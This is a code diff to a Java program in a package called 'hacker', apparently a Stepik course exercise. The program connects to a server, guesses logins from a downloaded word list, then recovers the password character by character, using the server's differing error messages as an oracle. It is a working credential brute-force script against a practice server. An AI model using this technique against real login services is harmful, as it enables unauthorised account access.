@@ -1,5 +1,8 @@
 package hacker;
 
+import com.google.gson.Gson;
+import com.google.gson.GsonBuilder;
+
 import java.io.*;
 import java.net.Socket;
 import java.net.URL;
@@ -15,22 +18,53 @@ public class Main {
              DataInputStream input = new DataInputStream(socket.getInputStream());
              DataOutputStream output = new DataOutputStream(socket.getOutputStream())) {
 
-            URL url = new URL("https://stepik.org/media/attachments/lesson/255258/passwords.txt");
+            String abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+
+            String trueLogin = "";
+            String truePassword = "";
+            boolean isDone = false;
+
+            URL url = new URL("https://stepik.org/media/attachments/lesson/255258/logins.txt");
             Scanner sc = new Scanner(url.openStream(), StandardCharsets.UTF_8);
 
-            while (sc.hasNextLine()) {
-                String pass = sc.nextLine();
-                List<String> variants = getVariants(pass);
+            GsonBuilder gsonBuilder = new GsonBuilder();
+            Gson gson = gsonBuilder.setPrettyPrinting().create();
+
+            while (sc.hasNextLine() && trueLogin.isEmpty()) {
+                String login = sc.nextLine();
+                List<String> variants = getVariants(login);
                 for (String variant : variants) {
-                    output.writeUTF(variant);
+                    Request request = new Request(variant, "");
+                    String jsonRequest = gson.toJson(request);
+                    output.writeUTF(jsonRequest);
                     String receivedMsg = input.readUTF();
-                    if (Objects.equals(receivedMsg, "Connection success!")) {
-                        System.out.println(variant);
+                    Response response = gson.fromJson(receivedMsg, Response.class);
+                    if (Objects.equals(response.result, "Wrong password!")) {
+                        trueLogin = variant;
                         break;
                     }
                 }
             }
 
+            while (!isDone) {
+                for (int i = 0; i < abc.length(); i++) {
+                    String password = truePassword + abc.charAt(i);
+                    Request request = new Request(trueLogin, password);
+                    String jsonRequest = gson.toJson(request);
+                    output.writeUTF(jsonRequest);
+                    String receivedMsg = input.readUTF();
+                    Response response = gson.fromJson(receivedMsg, Response.class);
+                    if (Objects.equals(response.result, "Connection success!")) {
+                        System.out.println(jsonRequest);
+                        isDone = true;
+                        break;
+                    }
+                    if (Objects.equals(response.result, "Exception happened during login")) {
+                        truePassword = password;
+                        break;
+                    }
+                }
+            }
 
         } catch (IOException ignored) {
         }
@@ -66,4 +100,18 @@ public class Main {
         }
         return result;
     }
+}
+
+class Request {
+    String login;
+    String password;
+
+    public Request(String login, String password) {
+        this.login = login;
+        this.password = password;
+    }
+}
+
+class Response {
+    String result;
 }
